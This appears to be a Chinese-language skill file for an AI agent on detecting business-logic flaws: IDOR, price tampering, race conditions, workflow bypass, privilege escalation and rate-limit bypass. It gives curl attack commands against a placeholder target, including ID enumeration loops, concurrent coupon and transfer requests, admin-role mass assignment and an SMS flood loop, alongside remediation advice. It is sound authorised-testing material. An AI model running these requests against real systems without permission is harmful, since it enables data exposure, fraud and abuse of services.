---
name: business-logic-vulnerabilities
description: "业务逻辑漏洞检测 — IDOR/BOLA/价格篡改/竞态条件/越权操作/工作流程绕过。授权安全测试使用。补充 Hermes 缺失的业务逻辑检测能力。"
version: 1.0.0
author: Hermes Agent (inspired by Cybermes business-logic skills)
license: Apache-2.0
metadata:
  hermes:
    tags: [business-logic, idor, bola, race-condition, price-tampering, workflow-bypass]
    source: "https://github.com/Zyrexnn/Cybermes/tree/main/skills"
---

# 业务逻辑漏洞检测

> 业务逻辑漏洞是应用程序设计缺陷，不违反语法规则但违反业务规则。通常无法被自动化扫描器发现，需要人工分析业务流程。

## 漏洞类型

### 1. IDOR / BOLA（不安全的直接对象引用）

**原理**：应用使用可预测的标识符访问资源，未验证用户权限。

**检测方法**：

```bash
# 双账户矩阵测试
# Account A: user_a (id=101)
# Account B: user_b (id=102)

# 测试：A 的资源能否被 B 访问
curl -H "Authorization: Bearer $USER_B_TOKEN" \
  "https://TARGET/api/users/101/documents"

# 测试：递增/递减 ID
for id in {1..100}; do
  curl -s "https://TARGET/api/documents/$id" | grep -q "title" && echo "ID $id accessible"
done

# 测试：GUID 预测（如果可预测）
curl "https://TARGET/api/documents/550e8400-e29b-41d4-a716-446655440000"
curl "https://TARGET/api/documents/550e8400-e29b-41d4-a716-446655440001"
```

**常见位置**：
- `/api/users/{id}/documents`
- `/api/orders/{id}`
- `/api/files/{id}/download`
- `/api/invoices/{id}`

### 2. 价格/数量篡改

**原理**：客户端提交的价格/数量未在服务端验证。

**检测方法**：

```bash
# 测试：修改价格为负数
curl -X POST "https://TARGET/api/checkout" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "price": -100, "quantity": 1}'

# 测试：修改数量为小数/负数
curl -X POST "https://TARGET/api/cart" \
  -d '{"product_id": 1, "quantity": 0.5}'
curl -X POST "https://TARGET/api/cart" \
  -d '{"product_id": 1, "quantity": -1}'

# 测试：货币单位混淆
curl -X POST "https://TARGET/api/checkout" \
  -d '{"amount": 100, "currency": "JPY"}'  # 100 JPY vs 100 USD
```

### 3. 竞态条件（Race Condition）

**原理**：多个请求同时处理时，业务逻辑出现不一致。

**检测方法**：

```bash
# 测试：并发优惠券使用
for i in {1..10}; do
  curl -X POST "https://TARGET/api/coupon/apply" \
    -d '{"code": "DISCOUNT50"}' &
done
wait

# 测试：并发库存扣减
for i in {1..20}; do
  curl -X POST "https://TARGET/api/purchase" \
    -d '{"product_id": 1, "quantity": 1}' &
done
wait

# 测试：并发转账
for i in {1..10}; do
  curl -X POST "https://TARGET/api/transfer" \
    -d '{"from": "account_a", "to": "account_b", "amount": 100}' &
done
wait
```

**工具**：Turbo Intruder（Burp Suite 扩展）

### 4. 工作流程绕过

**原理**：跳过必要的业务步骤，直接访问后续功能。

**检测方法**：

```bash
# 测试：跳过支付直接完成订单
curl -X POST "https://TARGET/api/order/complete" \
  -d '{"order_id": 12345}'

# 测试：跳过验证步骤
curl -X POST "https://TARGET/api/account/verify" \
  -d '{"skip_verification": true}'

# 测试：直接访问管理功能
curl "https://TARGET/admin/dashboard"
# 不经过 /login → /2fa → /admin 流程
```

### 5. 越权操作（Privilege Escalation）

**原理**：普通用户执行管理员操作。

**检测方法**：

```bash
# 测试：普通用户访问管理 API
curl -H "Authorization: Bearer $USER_TOKEN" \
  "https://TARGET/api/admin/users"

# 测试：修改角色参数
curl -X POST "https://TARGET/api/user/update" \
  -d '{"user_id": 101, "role": "admin"}'

# 测试：Mass Assignment
curl -X POST "https://TARGET/api/user/profile" \
  -d '{"name": "test", "is_admin": true, "balance": 999999}'
```

### 6. 限制绕过

**原理**：绕过速率限制/使用限制/地理限制。

**检测方法**：

```bash
# 测试：绕过速率限制
for i in {1..100}; do
  curl -s "https://TARGET/api/sms/send" -d '{"phone": "1234567890"}' &
done

# 测试：绕过试用限制
curl -X POST "https://TARGET/api/trial/reset" \
  -d '{"user_id": 101}'

# 测试：绕过地理限制
curl -H "X-Forwarded-For: 1.2.3.4" \
  "https://TARGET/api/content"
```

## 检测方法论

### 步骤 1: 理解业务流程

1. 绘制业务流程图（用户注册→登录→下单→支付→发货）
2. 识别关键业务实体（用户、订单、产品、支付）
3. 识别业务规则（价格计算、库存管理、权限控制）

### 步骤 2: 识别信任边界

- 客户端 → 服务端：所有输入不可信
- 用户 → 管理员：权限边界
- 免费 → 付费：功能边界
- 步骤 A → 步骤 B：流程边界

### 步骤 3: 设计测试用例

| 测试类型 | 测试用例 | 预期结果 |
|----------|----------|----------|
| IDOR | 访问其他用户资源 | 应返回 403 |
| 价格篡改 | 修改价格为负数 | 应拒绝或修正 |
| 竞态条件 | 并发使用优惠券 | 应只使用一次 |
| 流程绕过 | 跳过支付步骤 | 应拒绝 |
| 越权 | 普通用户访问管理功能 | 应返回 403 |

### 步骤 4: 验证与报告

1. 每个发现必须有可复现的 PoC
2. 记录原始请求/响应
3. 评估业务影响（财务损失、数据泄露、声誉损害）
4. 提供修复建议

## 与其他漏洞的关系

| 业务逻辑漏洞 | 相关技术漏洞 | 组合风险 |
|-------------|-------------|----------|
| IDOR | 缺少授权检查 | 数据泄露 |
| 价格篡改 | 缺少输入验证 | 财务损失 |
| 竞态条件 | 缺少事务锁 | 库存/资金不一致 |
| 流程绕过 | 缺少状态验证 | 未授权操作 |
| 越权 | 缺少权限检查 | 系统 compromise |

## 修复建议

1. **IDOR**：实施对象级授权检查（`if resource.owner != current_user: return 403`）
2. **价格篡改**：服务端重新计算价格，不信任客户端提交
3. **竞态条件**：使用数据库事务 + 乐观锁/悲观锁
4. **流程绕过**：验证业务状态机，禁止跳过必要步骤
5. **越权**：实施 RBAC，最小权限原则
6. **限制绕过**：分布式速率限制（Redis），设备指纹

## 参考资源

- OWASP Business Logic Vulnerabilities
- PortSwigger Business Logic Vulnerabilities
- Cybermes business-logic-and-idor skill

## Related Skills

- `redteam-auth` — 认证授权测试
- `autonomous-godmode-hunter` — 自动化漏洞狩猎
- `api-testing` — API 安全测试
